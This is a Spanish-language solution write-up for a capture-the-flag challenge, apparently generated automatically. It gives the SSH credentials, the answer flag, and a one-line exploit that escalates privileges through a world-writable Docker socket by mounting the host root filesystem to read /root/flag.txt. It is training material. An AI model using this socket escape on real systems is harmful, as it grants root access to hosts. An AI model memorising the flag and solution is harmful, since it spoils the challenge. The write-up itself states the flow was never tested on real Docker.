# Solución — Docker Escape Room

## 1. Acceso inicial

```bash
ssh ctfuser@<host> -p 2222
# contraseña: ctf_docker_2024
```

El usuario `ctfuser` no tiene `sudo` ni pertenece al grupo `docker`.

## 2. Reconocimiento

```bash
ls -la /var/run/docker.sock
```

Se observa que el socket de Docker existe y tiene permisos de
lectura/escritura para cualquier usuario (`srw-rw-rw-`). Esto es la
vulnerabilidad central del reto: quien pueda escribir en ese socket puede
hablar directamente con el daemon de Docker, sin importar si el usuario
del sistema tiene privilegios o no — **el control del socket equivale a
control root del daemon**.

## 3. Explotación

Con el cliente `docker` (ya instalado en el contenedor `challenge`), se le
pide al daemon que cree un contenedor nuevo montando la raíz del sistema
de archivos del daemon (es decir, del contenedor `docker-host`) dentro de
ese nuevo contenedor:

```bash
docker -H unix:///var/run/docker.sock run --rm -v /:/mnt alpine cat /mnt/root/flag.txt
```

Explicación:

- `-H unix:///var/run/docker.sock` — habla con el daemon a través del
  socket expuesto.
- `-v /:/mnt` — monta la raíz del "host" (desde la perspectiva del
  daemon, es decir, el propio contenedor `docker-host`) dentro del nuevo
  contenedor `alpine`, en `/mnt`.
- `cat /mnt/root/flag.txt` — lee la bandera que se encuentra en
  `/root/flag.txt` dentro de `docker-host`.

## 4. Resultado esperado

```
FLAG{docker_sock_root_host_escape_1684}
```

## 5. Verificación automática

Desde una máquina con `sshpass` instalado y con la pila del reto
levantada (`docker-compose up -d --build`):

```bash
./solve.sh localhost 2222
```

El script se conecta por SSH, ejecuta el comando de explotación de forma
remota, y compara la bandera obtenida contra la esperada.

## Notas para quien corrija / despliegue

- El "host" es en realidad el contenedor `docker-host` (Docker-in-Docker),
  no el servidor físico real. Esto es intencional para que el reto sea
  seguro de alojar en cualquier infraestructura.
- Se requiere que `docker-host` tenga salida a internet para descargar la
  imagen `alpine` la primera vez que se explota el reto (o precargarla
  manualmente antes de la competencia).
- **Este flujo no pudo probarse en un entorno con Docker real durante la
  generación del reto** (el entorno de generación no contaba con un daemon
  Docker disponible). Se recomienda encarecidamente ejecutar
  `docker-compose up -d --build` y seguir estos pasos manualmente antes de
  usar el reto en una competencia real.
